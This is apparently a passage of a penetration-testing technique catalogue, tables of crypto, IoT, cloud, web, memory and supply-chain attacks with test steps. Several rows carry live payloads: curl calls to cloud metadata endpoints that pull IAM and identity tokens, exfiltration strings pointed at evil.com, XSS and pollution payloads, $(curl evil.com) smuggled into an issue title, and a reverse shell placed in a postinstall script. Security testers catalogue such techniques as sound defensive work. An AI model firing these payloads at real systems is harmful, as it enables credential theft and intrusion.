|---|---|---|---|---|
| CR01 | Padding Oracle Attack | Exploit error differences in CBC padding validation to decrypt ciphertext | Crypto/Block | PadBuster, padbuster.py — send modified ciphertext, observe error vs valid response |
| CR02 | CBC Bit-Flipping | Flip bits in CBC ciphertext block N to control plaintext of block N+1 | Crypto/Block | Modify ciphertext bytes, observe predictable plaintext changes after decryption |
| CR03 | ECB Block Manipulation | Reorder/duplicate ECB blocks to manipulate encrypted data (e.g., change role) | Crypto/Block | Identify ECB mode (identical plaintext blocks = identical ciphertext), swap blocks |
| CR04 | ECB Penguin / Block Detection | Detect ECB usage by checking for repeating ciphertext blocks | Crypto/Block | Encrypt known repeated plaintext, check if ciphertext blocks repeat |
| CR05 | IV Reuse Attack | Exploit reused initialization vectors to recover plaintext via XOR of ciphertexts | Crypto/Block | Capture multiple ciphertexts with same IV, XOR to cancel keystream |

## Hash Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| CR06 | Hash Length Extension | Append data to hash(secret||message) without knowing secret using Merkle-Damgard | Crypto/Hash | hash_extender, hashpump — if MAC = H(secret+msg), extend without knowing secret |
| CR07 | MD5 Collision Attack | Generate two different inputs with identical MD5 hash using chosen-prefix collision | Crypto/Hash | hashclash, fastcoll — generate collision pairs, check if app uses MD5 for integrity |
| CR08 | SHA1 Collision (SHAttered) | Produce two different PDFs with same SHA1 hash | Crypto/Hash | Check if SHA1 used for file integrity, code signing, or certificate fingerprints |
| CR09 | Rainbow Table Attack | Precomputed hash-to-plaintext lookup for unsalted password hashes | Crypto/Hash | RainbowCrack, ophcrack — check if passwords are hashed without salt |
| CR10 | Pass-the-Hash | Use captured NTLM/LM hash directly for authentication without cracking | Crypto/Hash | mimikatz, pth-toolkit, impacket — authenticate with hash to SMB/WMI/RDP |

## Side-Channel & Timing

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| CR11 | Timing Attack on Comparison | Exploit byte-by-byte string comparison timing to recover secrets | Crypto/Timing | Measure response times for each byte position of HMAC/token, statistical analysis |
| CR12 | Bleichenbacher Attack (PKCS#1 v1.5) | RSA padding oracle using millions of queries to decrypt ciphertext | Crypto/RSA | ROBOT scanner, check PKCS#1 v1.5 padding error oracle, TLS RSA key exchange |
| CR13 | Side-Channel via Cache Timing | Exploit CPU cache timing to extract cryptographic keys | Crypto/SideChannel | Flush+Reload, Prime+Probe — measure cache access patterns during crypto operations |

## Randomness & Token Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| CR14 | Weak PRNG Exploitation | Predict output of weak random number generators (Math.random, time-seeded) | Crypto/Random | z3 SMT solver, untwister — collect outputs, predict next values |
| CR15 | Predictable Token Generation | Guess session tokens or reset tokens based on predictable seeding | Crypto/Token | Collect multiple tokens, analyze entropy with Burp Sequencer, check patterns |
| CR16 | Nonce Reuse in ECDSA | Recover private key from two ECDSA signatures sharing the same nonce | Crypto/Signature | Collect signatures, check if r values repeat (same nonce), compute private key |

## Certificate & Key Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| CR17 | Null Byte in Certificate CN | Bypass certificate validation with null byte: evil.com\x00.target.com | Crypto/Cert | Check certificate parsing libraries for null byte handling in CN/SAN |
| CR18 | Wildcard Certificate Abuse | Exploit overly broad wildcard certs to impersonate any subdomain | Crypto/Cert | Check if *.target.com cert covers admin/internal subdomains, DNS takeover + cert |
| CR19 | Certificate Transparency Poisoning | Flood CT logs with fake pre-certificates to obscure real certificate issuance | Crypto/Cert | Monitor CT logs (crt.sh), check for anomalous certificate issuance |
| CR20 | Key Reuse Across Services | Exploit same private key used for TLS, JWT signing, API auth across services | Crypto/Key | Extract public key from TLS cert, check if same key signs JWTs or API tokens |
| CR21 | Weak Key Derivation (PBKDF2 low iterations) | Brute-force passwords when KDF uses insufficient iterations or no salt | Crypto/KDF | Check password hashing config: PBKDF2 < 100k iterations, bcrypt cost < 10, no salt |
| CR22 | ECDSA Biased Nonce | Recover ECDSA private key from nonces with even small bit bias | Crypto/Signature | Lattice attack (HNP) on collected signatures with biased nonces |
| CR23 | RSA Small Public Exponent | Decrypt RSA ciphertext when e=3 and message is small (cube root attack) | Crypto/RSA | Check RSA public exponent, if e=3 and no padding, compute cube root of ciphertext |

---

# 11. HARDWARE & IoT ATTACKS

> **Methods 508-530 | 23 techniques | Sources: IoT security research, embedded systems pentesting**

## Firmware Extraction

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| HW01 | Firmware Extraction via Binwalk | Extract filesystem and embedded files from firmware images | IoT/Firmware | binwalk -e firmware.bin, analyze extracted filesystem for hardcoded creds/keys |
| HW02 | SPI Flash Dump | Read firmware directly from SPI flash chip using hardware programmer | IoT/Firmware | flashrom with CH341A/Bus Pirate, connect to SPI chip MOSI/MISO/CLK/CS pins |
| HW03 | UART Shell Access | Connect to exposed UART pins to get serial console/root shell | IoT/Hardware | Logic analyzer to find TX/RX pins, screen/minicom at correct baud rate (115200) |
| HW04 | JTAG Debug Access | Attach to JTAG interface for full processor debug, memory read/write | IoT/Hardware | JTAGulator to identify pins, OpenOCD to attach, dump flash and RAM |
| HW05 | eMMC Chip-Off | Desolder eMMC flash chip to read contents directly | IoT/Hardware | Hot air rework station, eMMC socket adapter, read with eMMC reader |

## Embedded System Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| HW06 | Buffer Overflow on Embedded | Stack/heap overflow in firmware binary running without ASLR/NX protections | IoT/Binary | Fuzzing with Boofuzz against network services, GDB remote debug on device |
| HW07 | Format String on Embedded | Printf-family format string bugs in firmware to leak/write memory | IoT/Binary | Send %x%x%x%x in input fields, observe memory leaks in response |
| HW08 | Heap Spray on Embedded | Fill heap with controlled data to make exploitation reliable on embedded targets | IoT/Binary | Send repeated allocations via network protocol to place shellcode predictably |
| HW09 | Hardcoded Credentials in Firmware | Extract default/hardcoded passwords from firmware filesystem | IoT/Firmware | grep -r "password\|passwd\|secret" in extracted firmware, check /etc/shadow |
| HW10 | Firmware Downgrade Attack | Flash older vulnerable firmware to reintroduce patched vulnerabilities | IoT/Firmware | Check if firmware signing/version checks exist, attempt flashing older image |

## IoT Protocol Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| HW11 | MQTT Injection / Unauthorized Subscribe | Connect to unauthenticated MQTT broker, subscribe to all topics (#) | IoT/Protocol | mosquitto_sub -t '#' -h target — check if anonymous access to all topics |
| HW12 | CoAP Abuse | Exploit Constrained Application Protocol without authentication | IoT/Protocol | coap-client to enumerate /.well-known/core, access resources without auth |
| HW13 | Zigbee Sniffing & Replay | Capture and replay Zigbee packets, exploit default trust center key | IoT/Protocol | KillerBee with ApiMote, zbstumbler/zbdump, use default TC link key |
| HW14 | Modbus TCP Exploitation | Read/write industrial control registers via unauthenticated Modbus | IoT/ICS | mbtget, Metasploit modbus modules — read holding registers, write coils |
| HW15 | UPnP/SSDP Abuse | Exploit Universal Plug and Play to open ports, redirect traffic | IoT/Protocol | miranda-upnp, enumerate devices, add port mappings via SOAP commands |

## Side-Channel Attacks (Hardware)

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| HW16 | Simple Power Analysis (SPA) | Observe power consumption traces to recover crypto keys from single trace | HW/SideChannel | Oscilloscope on power rail during crypto operation, visual pattern analysis |
| HW17 | Differential Power Analysis (DPA) | Statistical analysis of many power traces to extract secret keys | HW/SideChannel | ChipWhisperer, collect 1000+ traces during AES, CPA attack on intermediate values |
| HW18 | Electromagnetic Emanation | Capture EM radiation from processor to recover processed data | HW/SideChannel | Near-field EM probe + SDR, analyze emanation during crypto operations |

## Fault Injection

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| HW19 | Voltage Glitching | Brief voltage drop to cause CPU instruction skip (bypass secure boot check) | HW/Fault | ChipWhisperer, crowbar circuit on VCC — glitch during boot/auth check |
| HW20 | Clock Glitching | Inject clock irregularity to cause instruction fault | HW/Fault | ChipWhisperer clock glitching module, target clock input during sensitive operation |
| HW21 | Laser Fault Injection | Focused laser on decapped IC to flip individual bits in memory/registers | HW/Fault | Riscure Inspector, decap chip with fuming nitric acid, target specific transistors |

## Boot Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| HW22 | Secure Boot Bypass | Exploit weaknesses in secure boot chain to load unsigned firmware | IoT/Boot | Check for unsigned bootloader stages, key extraction, rollback to unsigned version |
| HW23 | Bootloader Exploitation | Exploit U-Boot/custom bootloader for shell access or memory dumping | IoT/Boot | Interrupt boot process (hold key during UART), access bootloader CLI, dump flash |

---

# 12. CLOUD-SPECIFIC ATTACKS

> **Methods 531-553 | 23 techniques | Sources: MITRE ATT&CK Cloud, cloud security research**

## AWS Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| CL01 | IMDS v1 Exploitation | Access EC2 metadata at 169.254.169.254 without session token to steal IAM role credentials | AWS/SSRF | curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ via SSRF |
| CL02 | AssumeRole Abuse | Chain sts:AssumeRole to escalate privileges across accounts/roles | AWS/IAM | enumerate roles with iam:ListRoles, attempt sts:AssumeRole on each with Pacu |
| CL03 | S3 ACL Confusion | Exploit misconfigured S3 bucket ACLs (authenticated-users = ANY AWS account) | AWS/Storage | aws s3 ls s3://bucket --no-sign-request, test PUT/GET with any AWS account creds |
| CL04 | Lambda Injection | Inject code into Lambda function through event data (env vars, layers, triggers) | AWS/Serverless | Pass OS commands in Lambda event parameters, check for unsanitized input in handler |
| CL05 | ECS Task Role Theft | Access ECS task metadata endpoint to steal task IAM role credentials | AWS/Container | curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI from container |
| CL06 | CloudFormation Injection | Inject malicious resources into CloudFormation templates via parameter injection | AWS/IaC | Check for user-controlled template parameters, inject additional IAM policies/resources |
| CL07 | Cognito Pool Misconfiguration | Exploit open Cognito user pool to self-register and obtain AWS credentials | AWS/Auth | aws cognito-idp sign-up with open pool, get identity credentials from identity pool |
| CL08 | S3 Bucket Enumeration | Discover S3 buckets by guessing common naming patterns (company-backup, prod-data) | AWS/Storage | aws s3 ls s3://target-{backup,data,logs,dev,staging} — check existence and permissions |

## Azure Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| CL09 | Managed Identity Token Theft | Access Azure IMDS to steal managed identity OAuth token | Azure/IAM | curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01 |
| CL10 | Storage Account Key Extraction | Enumerate and extract storage account access keys via Azure management API | Azure/Storage | az storage account keys list, check if RBAC allows key access from compromised identity |
| CL11 | Azure AD Token Theft (PRT) | Extract Primary Refresh Token for persistent Azure AD access | Azure/AD | mimikatz, ROADtools — dump PRT from device, use for cloud API access |
| CL12 | Runbook Exploitation | Abuse Azure Automation runbooks running as high-privilege service principal | Azure/Automation | Check Automation Account RBAC, inject commands into runbook parameters |
| CL13 | Azure Function SSRF | Exploit Azure Functions to reach internal management APIs (169.254.169.254) | Azure/Serverless | SSRF payload targeting Azure IMDS, extract MSI token via metadata endpoint |

## GCP Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| CL14 | GCP Metadata Server Abuse | Access http://metadata.google.internal for service account tokens | GCP/SSRF | SSRF to http://metadata.google.internal/computeMetadata/v1/ with Metadata-Flavor: Google |
| CL15 | Service Account Impersonation | Use iam.serviceAccounts.getAccessToken to impersonate higher-privileged SA | GCP/IAM | gcloud auth print-access-token --impersonate-service-account=high-priv@proj.iam |
| CL16 | Cloud Function Injection | Inject commands through Cloud Function HTTP triggers with unsanitized input | GCP/Serverless | Pass OS commands in function parameters, check for subprocess calls in handler |
| CL17 | GCS Bucket Misconfiguration | Access Google Cloud Storage buckets with allUsers/allAuthenticatedUsers permissions | GCP/Storage | gsutil ls gs://target-bucket, check IAM bindings for public access |

## Kubernetes Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| CL18 | Pod Escape (Container Breakout) | Escape container to host using privileged mode, hostPath, or kernel exploits | K8s/Container | Check securityContext.privileged, mount host filesystem, exploit runc CVEs |
| CL19 | RBAC Abuse | Exploit overly permissive RBAC roles to escalate within cluster | K8s/IAM | kubectl auth can-i --list, check for wildcard verbs/resources, create privileged pods |
| CL20 | Kubelet API Exploitation | Access unauthenticated kubelet API (port 10250) to exec into pods | K8s/API | curl https://node:10250/pods, curl https://node:10250/run/namespace/pod/container |
| CL21 | etcd Exposure | Read etcd directly to extract all cluster secrets and configurations | K8s/Storage | etcdctl get / --prefix --keys-only, check if etcd port (2379) is exposed |
| CL22 | Service Account Token Theft | Read mounted service account token from pod to access Kubernetes API | K8s/Auth | cat /var/run/secrets/kubernetes.io/serviceaccount/token, use with kubectl |
| CL23 | Helm Tiller Exploitation | Exploit unauthenticated Tiller (Helm v2) for cluster-admin RCE | K8s/RCE | helm --host tiller:44134 install malicious-chart, check for Tiller service |

---

# 13. ADVANCED WEB ATTACKS

> **Methods 554-580 | 27 techniques | Sources: PortSwigger research, web security community**

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| AW01 | HTTP Parameter Pollution | Supply duplicate parameters to cause backend parsing discrepancy | Web/Injection | Send ?param=good&param=evil, check which value reaches backend logic |
| AW02 | Web Cache Poisoning (X-Forwarded-Host) | Inject X-Forwarded-Host to poison cached response with attacker-controlled URLs | Web/Cache | Add X-Forwarded-Host: evil.com, check if cached response includes evil.com links |
| AW03 | Web Cache Poisoning (X-Original-URL) | Use X-Original-URL header to change cached route target | Web/Cache | Add X-Original-URL: /admin to request for /, check if cached response serves /admin |
| AW04 | Web Cache Poisoning (Fat GET) | Include body in GET request that gets cached but body content is processed | Web/Cache | GET request with body parameter that overrides query param, check cached response |
| AW05 | Web Cache Deception (Path Confusion) | Trick cache into storing authenticated response: /account/nonexist.css | Web/Cache | Append .css/.js/.png to authenticated endpoint, check if response is cached publicly |
| AW06 | Web Cache Deception (Extension Appending) | Append static file extension to API endpoint to trigger caching of sensitive data | Web/Cache | /api/me/test.js, /profile/x.css — check if CDN caches authenticated API response |
| AW07 | Prototype Pollution (Server-Side) | Pollute Object.prototype on Node.js server to modify application behavior | Web/JS | Send {"__proto__":{"isAdmin":true}} in JSON body, check for privilege changes |
| AW08 | Prototype Pollution (Client-Side) | Pollute Object.prototype via URL params or JSON to achieve XSS | Web/JS | ?__proto__[innerHTML]=<img/src/onerror=alert(1)>, check if DOM uses polluted property |
| AW09 | DOM Clobbering | Override JavaScript variables using HTML elements with matching id/name attributes | Web/DOM | Inject <a id=config><a id=config name=url href=evil.com> to override window.config.url |
| AW10 | Dangling Markup Injection | Inject unclosed HTML tag to capture subsequent page content (tokens, CSRF) | Web/Injection | Inject <img src="https://evil.com/steal? to capture everything until next matching quote |
| AW11 | CSS Injection (Data Exfiltration) | Extract data via CSS attribute selectors loading attacker-controlled URLs | Web/CSS | input[value^="a"]{background:url(evil.com/a)}, iterate to extract CSRF tokens |
| AW12 | PDF Injection (SSRF via PDF Generator) | Inject HTML/JS into PDF generators (wkhtmltopdf, Puppeteer) for SSRF/file read | Web/SSRF | <iframe src="file:///etc/passwd"> or XMLHttpRequest to 169.254.169.254 in PDF input |
| AW13 | SVG XSS | Upload SVG file containing JavaScript event handlers for stored XSS | Web/XSS | Upload <svg onload=alert(1)> or <svg><script>alert(1)</script></svg> as image |
| AW14 | Polyglot Payloads | Craft file that is simultaneously valid in multiple formats (JPEG+JS, PDF+JS) | Web/Bypass | Create JPEG with valid JS comment structure, upload as image, include as script |
| AW15 | Content-Type Confusion | Send request with mismatched Content-Type to bypass input validation | Web/Bypass | POST JSON body with Content-Type: application/x-www-form-urlencoded, or vice versa |
| AW16 | HTTP Verb Tampering | Use unexpected HTTP method to bypass access controls (GET instead of POST) | Web/AuthZ | Replace POST with GET/PUT/PATCH/DELETE/HEAD/OPTIONS, check if access control enforced |
| AW17 | CORS Null Origin Bypass | Use null origin (from sandboxed iframe or data: URI) to bypass CORS checks | Web/CORS | iframe sandbox srcdoc with fetch to target API, check if null origin reflected in ACAO |
| AW18 | postMessage Exploitation | Exploit missing origin validation in window.postMessage handlers | Web/DOM | Find addEventListener("message") without origin check, send crafted messages from iframe |
| AW19 | Service Worker Hijacking | Register malicious service worker to intercept all future requests from scope | Web/Persistence | Find SW registration point, inject script to register evil service worker on same scope |
| AW20 | WebRTC IP Leak | Use WebRTC STUN requests to discover victim's real IP behind VPN/proxy | Web/Privacy | new RTCPeerConnection({iceServers:[{urls:"stun:evil.com"}]}), capture STUN request |
| AW21 | Subdomain Takeover (All Providers) | Claim unclaimed cloud resources (S3, Azure, GitHub Pages, Heroku, etc.) on dangling CNAMEs | Web/Takeover | Check CNAME -> cloud provider, verify resource unclaimed, register matching resource |
| AW22 | Account Pre-Takeover | Register account with victim's email before they do, gain access after they verify | Web/Account | Register with target email on site that doesn't verify first, wait for victim to verify/reset |
| AW23 | Class Pollution (Python) | Python equivalent of prototype pollution via __class__.__init__.__globals__ | Web/Injection | Send {"__class__":{"__init__":{"__globals__":{"secret":"pwned"}}}} in JSON to Python backend |
| AW24 | GraphQL Batching Attack | Send array of queries in single request to bypass rate limiting on login/OTP | Web/GraphQL | POST [{"query":"mutation{login(user:\"a\",pass:\"1\")}"}, ...] as batch array |
| AW25 | CRLF Injection to XSS | Inject \r\n in HTTP headers to add response body with XSS payload | Web/Injection | %0d%0a%0d%0a<script>alert(1)</script> in header-reflected parameter |
| AW26 | Request Smuggling via HTTP/2 (H2.TE) | Exploit HTTP/2-to-HTTP/1.1 downgrade with smuggled Transfer-Encoding | Web/Smuggling | Send HTTP/2 request with TE:chunked that gets forwarded to HTTP/1.1 backend |
| AW27 | Edge Side Include (ESI) Injection | Inject ESI tags into cached content to execute server-side includes | Web/Cache | <esi:include src="http://evil.com/steal"/> in input that gets cached by Varnish/Akamai |

---

# 14. BINARY & MEMORY ATTACKS

> **Methods 581-596 | 16 techniques | Sources: CWE, exploit development research**

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| BM01 | Stack Buffer Overflow | Overwrite return address on stack by writing past buffer boundary | Binary/Memory | Fuzzing with long inputs, pattern_create to find offset, overwrite EIP/RIP |
| BM02 | Heap Buffer Overflow | Corrupt heap metadata by overflowing heap-allocated buffer to achieve code execution | Binary/Memory | Fuzz heap allocations, overwrite adjacent heap chunks, exploit unlink/fastbin |
| BM03 | Integer Overflow | Cause arithmetic overflow to produce small allocation + large copy = heap/stack overflow | Binary/Memory | Send MAX_INT or negative values for size parameters, check for wraparound |
| BM04 | Format String Vulnerability | Use printf-family format specifiers (%x, %n) to read/write arbitrary memory | Binary/Memory | Send %x.%x.%x.%x in string inputs, observe leaked stack data or crash with %n |
| BM05 | Use-After-Free | Access memory after it's been freed to hijack control flow via dangling pointer | Binary/Memory | Trigger free then reallocation of same size with controlled data, call freed object method |
| BM06 | Double-Free | Free the same memory twice to corrupt allocator metadata for arbitrary write | Binary/Memory | Trigger same free path twice, use resulting corrupted freelist for controlled allocation |
| BM07 | Type Confusion | Treat object as wrong type to access unintended memory or call wrong vtable entry | Binary/Memory | Trigger type mismatch in polymorphic code, access fields at wrong offsets |
| BM08 | Return-Oriented Programming (ROP) | Chain existing code gadgets ending in RET to execute arbitrary computation | Binary/Exploit | ROPgadget, ropper to find gadgets, chain them to call system("/bin/sh") |
| BM09 | Heap Spraying | Fill heap with attacker-controlled data to make exploits reliable | Binary/Exploit | Allocate many same-sized objects with NOP sled + shellcode, jump to predictable address |
| BM10 | Stack Canary Bypass | Leak or brute-force stack canary value to exploit buffer overflow despite protection | Binary/Bypass | Format string to leak canary, fork-based brute force (byte-by-byte), overwrite with leaked value |
| BM11 | ASLR Bypass | Defeat address space layout randomization via info leak or brute force | Binary/Bypass | Leak pointer via format string/info disclosure, calculate base address, or brute force 32-bit ASLR |
| BM12 | DEP/NX Bypass | Execute code despite non-executable memory by using ROP or ret2libc | Binary/Bypass | Chain ROP gadgets to call mprotect() or system(), avoid direct shellcode execution |
| BM13 | Ret2libc | Return into libc functions (system, execve) instead of shellcode to bypass NX | Binary/Exploit | Overwrite return address with system@plt, set up "/bin/sh" argument on stack |
| BM14 | Sigreturn-Oriented Programming (SROP) | Use sigreturn syscall to set all registers at once for controlled syscall | Binary/Exploit | Push SigreturnFrame on stack, trigger sigreturn to set rax=59(execve), rdi="/bin/sh" |
| BM15 | JIT Spray | Abuse JIT compiler to place attacker-controlled executable code at predictable addresses | Binary/Exploit | Craft input that JIT-compiles to desired shellcode (e.g., XOR constants in JS) |
| BM16 | Uninitialized Memory Use | Read stack/heap memory that wasn't zeroed to leak sensitive data | Binary/Memory | Trigger code path that reads buffer before initialization, observe leaked pointers/keys |

---

# 15. SUPPLY CHAIN & CI/CD ATTACKS

> **Methods 597-610 | 14 techniques | Sources: MITRE ATT&CK, software supply chain research**

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| SC01 | Dependency Confusion | Publish public package with same name as private internal package at higher version | SupplyChain/Package | Check if org uses private registry, publish higher-version public package, monitor for install |
| SC02 | Typosquatting Packages | Register packages with names similar to popular ones (e.g., reqeusts vs requests) | SupplyChain/Package | Check for common typos of target's dependencies, audit package.json/requirements.txt |
| SC03 | GitHub Actions Injection | Inject commands via issue title/body/PR that gets interpolated in workflow run | SupplyChain/CI | Create issue with title containing $(curl evil.com), check if workflow uses ${{github.event.issue.title}} |
| SC04 | CI/CD Pipeline Poisoning | Modify CI config (Jenkinsfile, .gitlab-ci.yml) in PR to execute malicious build steps | SupplyChain/CI | Submit PR modifying CI config, check if pipeline runs on untrusted PR without approval |
| SC05 | Build Artifact Tampering | Replace legitimate build artifacts in artifact storage with backdoored versions | SupplyChain/Build | Check artifact repository permissions, attempt upload of modified artifact with same name |
| SC06 | Container Image Poisoning | Push backdoored image to registry with same tag as legitimate image | SupplyChain/Container | Check registry permissions, push modified image to :latest tag, verify if pulled automatically |
| SC07 | Package Manifest Manipulation | Modify package install scripts (postinstall, setup.py) to execute during npm/pip install | SupplyChain/Package | Add reverse shell to postinstall script, publish package, check if install executes scripts |
| SC08 | Compromised GitHub Action | Use or create malicious third-party GitHub Action that exfiltrates secrets | SupplyChain/CI | Audit third-party Actions for secret access, check if pinned to SHA vs mutable tag |
| SC09 | Protestware / Maintainer Sabotage | Detect packages where maintainer intentionally introduces malicious code | SupplyChain/Package | Monitor dependency changelogs, audit new releases of critical dependencies for suspicious code |
| SC10 | Lock File Injection | Modify package-lock.json/yarn.lock to point to malicious registry or tarball | SupplyChain/Package | Submit PR with modified lockfile pointing resolved URLs to attacker-controlled registry |
| SC11 | Git Hook Exploitation | Plant malicious git hooks in repository that execute on clone/commit/push | SupplyChain/Git | Check .githooks/ directory for scripts, audit pre-commit/post-checkout hooks |
| SC12 | Secrets in CI/CD Logs | Extract secrets leaked in CI/CD build logs through error messages or debug output | SupplyChain/CI | Review public CI logs for AWS keys, tokens, passwords in build output |
| SC13 | Self-Hosted Runner Exploitation | Compromise self-hosted CI runner to access all repository secrets and code | SupplyChain/CI | Check if self-hosted runners are shared across repos, exploit runner to access secrets |
| SC14 | Dependency Tree Poisoning | Compromise a transitive (indirect) dependency to affect all downstream packages | SupplyChain/Package | Map dependency tree, identify unmaintained transitive deps, check for account takeover potential |

---

> **Total methods: 610 | 8 new categories added | The pack's knowledge base is complete.**
> **Every method has a name, description, category tag, and how to test — ready for the hunt.**
